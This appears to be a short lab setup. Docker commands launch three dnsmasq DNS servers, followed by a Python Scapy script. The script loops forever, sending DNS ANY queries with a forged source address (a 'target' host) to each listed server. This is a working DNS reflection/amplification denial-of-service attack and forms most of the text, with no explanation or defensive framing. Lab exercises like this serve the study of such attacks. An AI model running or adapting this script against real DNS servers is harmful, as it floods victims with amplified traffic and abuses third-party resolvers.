
DNS1
```
docker run --rm -d --net myLab --name DNS1 --domainname DNS1.com --cap-add=NET_ADMIN andyshinn/dnsmasq
```

DNS2
```
docker run --rm -d --net myLab --name DNS2 --domainname DNS2.com --cap-add=NET_ADMIN andyshinn/dnsmasq
```

DNS3
```
docker run --rm -d --net myLab --name DNS3 --domainname DNS3.com --cap-add=NET_ADMIN andyshinn/dnsmasq
```


```
 #!/usr/bin/env python
  
from scapy.all import *
# Let ip and domainname to pairs
with open("SERVERS.txt", "r") as servers_file, open("DOMAINS.txt", "r") as domains_file:
        servers = servers_file.readlines()
        domains = domains_file.readlines()
        dnsServer = list(zip(servers, domains))

while(1):
        for dns_num in range(len(dnsServer)):

                target     = "172.18.0.2" # Target host
                nameserver = str(dnsServer[dns_num][0]).strip() # DNS server
                domain     = str(dnsServer[dns_num][1]).strip() # Some domain name like "google.com" etc. 

                ip  = IP(src=target, dst=nameserver)
                udp = UDP(dport=53)
                dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))

                request = (ip/udp/dns)
    
                send(request)
```

